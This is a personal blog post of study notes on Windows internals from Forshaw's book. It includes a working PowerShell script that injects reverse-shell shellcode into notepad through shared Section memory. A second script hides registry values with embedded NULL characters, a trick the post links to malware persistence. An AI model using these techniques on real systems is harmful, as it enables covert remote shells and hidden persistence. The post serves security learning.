---
title: Windows Security Internals - Part I - Examples
date: 2025-02-07 00:00:00 +/-0000
categories: [Guides, Windows Security Internals]
tags: []     # TAG names should always be lowercase
---

I started reading *Windows Security Internals* by James Forshaw to learn more about how Windows privilege escalation works. When I was first learning this stuff, I wasn't sure why certain things worked or didn't work. I was learning the basic Windows privilege escalation techniques used on the OSCP: DLL/exe hijacking, token abuse, PrintSpoofer and potato exploits, etc. Now that I'm going back and actually learning how this stuff works, it's a lot easier to understand. I'll eventually post my full notes here once I'm done with the book. In the meantime, this post is about some examples I came up with after reading the first part.

Part I is an overview of how Windows works, covering the Windows NT kernel, system calls, and user-mode APIs. The author wrote the `NtObjectManger` powershell module, which lets you use dotnet to make system calls in powershell. I previously did all my experiments with the Win32 API in C, and being able to use powershell instead has made the learning process go faster.

I noticed two interesting things in the first part: `Section` memory objects, and inserting null characters into registry keys.

***
**Section Objects and Process Injection with Mapped Sections**

A `Section` object reserves a region of memory in the kernel, which can be backed by a file or just memory space. They can be used to read/write a file as if it was stored in memory, or to share memory between processes. Processes can access this memory by mapping a *view* of the section into their virtual memory space. 

You can see right away how this can be used for remote process injection:
1. Create a new `Section` object in the kernel
2. Map the section to a local process and a remote process
3. Write shellcode to the local process' view of the section
4. Since the memory is shared between processes, the memory containing the shellcode is accessible to the remote process
5. Start a new thread in the remote process at the base address of the remote process' view of the section

My powershell script that demonstrates this technique:
```powershell
Import-Module NtObjectManager

#MSFVenom reverse tcp shell
[Byte[]] $buf = <shellcode>

#Create a new notepad process
$proc = New-Win32Process -CommandLine "notepad.exe"

#Create a new section
$section = New-NtSection -Size 4096 -Protection ExecuteReadWrite

#Map the section to the current process and the remote notepad process
$localmap = Add-NtSection -Section $section -Protection ReadWrite -Process $(Get-NtProcess -pid $PID)
$remotemap = Add-NtSection -Section $section -Protection ExecuteReadWrite -Process $proc

#Write shellcode to the local mapped section
Write-NtVirtualMemory -Address $localmap.BaseAddress -Data $buf

#Show where our sections are mapped
Get-NtVirtualMemory $localmap.BaseAddress
Get-NtVirtualMemory $remotemap.BaseAddress -Process $proc

#Create a new thread to execute the shellcode
$thread = New-NtThread -StartRoutine $remotemap.BaseAddress -Process $proc

```

When we run this script, notepad pops up and we get a reverse shell:
![](assets/img/1wsip.png)


***

**Hidden Registry Keys**

The native Windows APIs uses unicode strings which can contain NULL characters. The Win32 API uses C-style strings which are terminated by NULL characters. This means that we can manipulate entries in the registry using NULL characters with the native API, which won't be correctly handled if they are queried with the Win32 API. This is used in some malware, where a Run key is set using NULL characters to autorun a payload for presistence. Whatever keys we set will not be shown by `reg query` or `Get-ItemProperty`. 

This script creates a new registry key and sets a hidden value:
```powershell
$key = New-NtKey -Win32Path "HKCU\`0hidden"
Set-NtKeyValue -Key $key -Name "`0invisible" -String "hidden value"
Get-Item "NtKeyUser:\`0hidden"
Get-NtKeyValue $key
```

Using regedit, we can see that a blank folder is visible, which gives us an error message when clicked on:
![](assets/img/2wsip.png)

